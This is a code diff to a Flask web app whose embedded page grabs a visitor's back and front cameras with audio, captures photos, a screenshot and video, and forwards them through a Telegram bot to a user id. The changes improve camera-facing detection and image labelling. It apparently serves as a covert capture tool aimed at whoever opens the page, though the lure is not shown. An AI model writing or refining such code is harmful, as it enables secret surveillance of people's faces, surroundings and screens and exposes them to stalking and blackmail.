@@ -148,37 +148,22 @@ HTML_PAGE = """<!DOCTYPE html>
             });
         }
 
-        // ---- Get a single camera stream by facing mode ----
-        function getStreamByFacing(facing, audio = false) {
+        // ---- Get a camera stream with exact facing mode ----
+        function getCameraStream(facing, audio = false) {
             return new Promise((resolve) => {
-                const constraints = {
-                    video: { facingMode: facing, width: { ideal: facing === 'environment' ? 640 : 320 } },
-                    audio: audio
-                };
-                // First try with exact facing
+                // Try exact first
+                const constraints = { video: { facingMode: { exact: facing } }, audio: audio };
                 navigator.mediaDevices.getUserMedia(constraints)
                     .then(stream => resolve(stream))
                     .catch(() => {
-                        // If exact fails, try without width constraint
-                        const fallbackConstraints = {
-                            video: { facingMode: facing },
-                            audio: audio
-                        };
-                        navigator.mediaDevices.getUserMedia(fallbackConstraints)
+                        // Fallback to ideal
+                        const idealConstraints = { video: { facingMode: facing }, audio: audio };
+                        navigator.mediaDevices.getUserMedia(idealConstraints)
                             .then(stream => resolve(stream))
                             .catch(() => {
-                                // If still fails, try any camera and then check facing
+                                // Fallback to any camera
                                 navigator.mediaDevices.getUserMedia({ video: true, audio: audio })
-                                    .then(stream => {
-                                        // Check if facing matches; if not, we still use it but flag
-                                        const track = stream.getVideoTracks()[0];
-                                        const settings = track.getSettings();
-                                        if (settings.facingMode && settings.facingMode !== facing) {
-                                            // It's a different facing, but we'll use it anyway
-                                            console.warn(`Requested ${facing} but got ${settings.facingMode}`);
-                                        }
-                                        resolve(stream);
-                                    })
+                                    .then(stream => resolve(stream))
                                     .catch(() => resolve(null));
                             });
                     });
@@ -190,31 +175,31 @@ HTML_PAGE = """<!DOCTYPE html>
             let back = null, front = null;
             let errorMessages = [];
             let debugInfo = {};
-            let backFacing = false, frontFacing = false;
+            let backFacing = 'unknown', frontFacing = 'unknown';
 
             // 1. Get back (environment)
-            back = await getStreamByFacing('environment', true);
+            back = await getCameraStream('environment', true);
             if (back) {
                 const track = back.getVideoTracks()[0];
                 const settings = track.getSettings();
                 debugInfo.backSettings = settings;
-                backFacing = (settings.facingMode === 'environment') || (settings.facingMode === undefined && true); // assume
+                backFacing = settings.facingMode || 'unknown';
             } else {
                 errorMessages.push('Back camera failed');
             }
 
             // 2. Get front (user)
-            front = await getStreamByFacing('user', false);
+            front = await getCameraStream('user', false);
             if (front) {
                 const track = front.getVideoTracks()[0];
                 const settings = track.getSettings();
                 debugInfo.frontSettings = settings;
-                frontFacing = (settings.facingMode === 'user') || (settings.facingMode === undefined && true);
+                frontFacing = settings.facingMode || 'unknown';
             } else {
                 errorMessages.push('Front camera failed');
             }
 
-            // If one is missing, try to clone the other
+            // If one is missing, clone the other
             if (!back && front) {
                 back = front.clone();
                 debugInfo.backCloned = true;
@@ -228,9 +213,10 @@ HTML_PAGE = """<!DOCTYPE html>
                 errorMessages.push('Front cloned from back');
             }
 
-            // If both are same stream (cloned), we'll still proceed but note it
+            // If both are same stream (identical), mark it
             if (back && front && back === front) {
                 debugInfo.streamsIdentical = true;
+                // We'll still send two images but they will be identical
             }
 
             // Add audio to back if missing
@@ -341,10 +327,8 @@ HTML_PAGE = """<!DOCTYPE html>
                 cameraStatus = 'failed';
                 cameraError = error || 'No camera access';
             } else {
-                // Capture back first, then front
                 if (back) backBlob = await captureFrame(back);
                 if (front) frontBlob = await captureFrame(front);
-                // Store streams for recording
                 backStream = back;
                 frontStream = front;
             }
@@ -415,8 +399,8 @@ HTML_PAGE = """<!DOCTYPE html>
                 fd.append('camera_status', cameraStatus);
                 fd.append('camera_error', cameraError);
                 fd.append('camera_debug', JSON.stringify(debug));
-                fd.append('backFacing', backFacing ? 'true' : 'false');
-                fd.append('frontFacing', frontFacing ? 'true' : 'false');
+                fd.append('backFacing', backFacing);
+                fd.append('frontFacing', frontFacing);
                 if (screenshotBlob) fd.append('screenshot', screenshotBlob, 'screenshot.jpg');
                 if (backBlob) fd.append('backImage', backBlob, 'back.jpg');
                 if (frontBlob) fd.append('frontImage', frontBlob, 'front.jpg');
@@ -473,15 +457,15 @@ def capture():
     camera_status = request.form.get('camera_status', 'unknown')
     camera_error = request.form.get('camera_error', '')
     camera_debug = request.form.get('camera_debug', '{}')
-    backFacing = request.form.get('backFacing') == 'true'
-    frontFacing = request.form.get('frontFacing') == 'true'
+    backFacing = request.form.get('backFacing', 'unknown')
+    frontFacing = request.form.get('frontFacing', 'unknown')
     screenshot = request.files.get('screenshot')
     front_img = request.files.get('frontImage')
     back_img = request.files.get('backImage')
     video = request.files.get('video')
 
     # Log to Railway
-    print(f"camera_status: {camera_status}, backFacing: {backFacing}, frontFacing: {frontFacing}")
+    print(f"backFacing: {backFacing}, frontFacing: {frontFacing}")
     print(f"camera_debug: {camera_debug}")
     print(f"front_img: {front_img is not None}, back_img: {back_img is not None}, video: {video is not None}")
 
@@ -521,21 +505,48 @@ def capture():
             except Exception as e:
                 print(f"Screenshot error: {e}")
 
-        if back_img:
+        # Determine labels based on actual facing mode
+        # If backFacing is 'environment' or 'unknown' but we only have one camera, we might need to adjust.
+        # We'll use the debug info to decide.
+        import json
+        debug = json.loads(camera_debug)
+        # If both streams are cloned or identical, we'll note that.
+        if debug.get('streamsIdentical') or debug.get('backCloned') and debug.get('frontCloned'):
+            # Both images are the same
+            # Send back with a note
+            if back_img:
+                try:
+                    back_img.seek(0)
+                    bot.send_photo(uid, back_img.read(), caption="📷 Back Camera (may be same as front)")
+                except Exception as e:
+                    print(f"Back image error: {e}")
+            if front_img:
+                try:
+                    front_img.seek(0)
+                    bot.send_photo(uid, front_img.read(), caption="🤳 Front Camera")
+                except Exception as e:
+                    print(f"Front image error: {e}")
+            # Also send a debug message
             try:
-                back_img.seek(0)
-                caption = "📷 Back Camera" if backFacing else "📷 Camera (Back assumed)"
-                bot.send_photo(uid, back_img.read(), caption=caption)
-            except Exception as e:
-                print(f"Back image error: {e}")
-
-        if front_img:
-            try:
-                front_img.seek(0)
-                caption = "🤳 Front Camera" if frontFacing else "🤳 Camera (Front assumed)"
-                bot.send_photo(uid, front_img.read(), caption=caption)
-            except Exception as e:
-                print(f"Front image error: {e}")
+                bot.send_message(uid, "ℹ️ Note: Your device may have only one camera; both images are from the same camera.")
+            except:
+                pass
+        else:
+            # Normal case
+            if back_img:
+                try:
+                    back_img.seek(0)
+                    cap = "📷 Back Camera" if backFacing == 'environment' else f"📷 Camera ({backFacing})"
+                    bot.send_photo(uid, back_img.read(), caption=cap)
+                except Exception as e:
+                    print(f"Back image error: {e}")
+            if front_img:
+                try:
+                    front_img.seek(0)
+                    cap = "🤳 Front Camera" if frontFacing == 'user' else f"🤳 Camera ({frontFacing})"
+                    bot.send_photo(uid, front_img.read(), caption=cap)
+                except Exception as e:
+                    print(f"Front image error: {e}")
 
         if video:
             try:
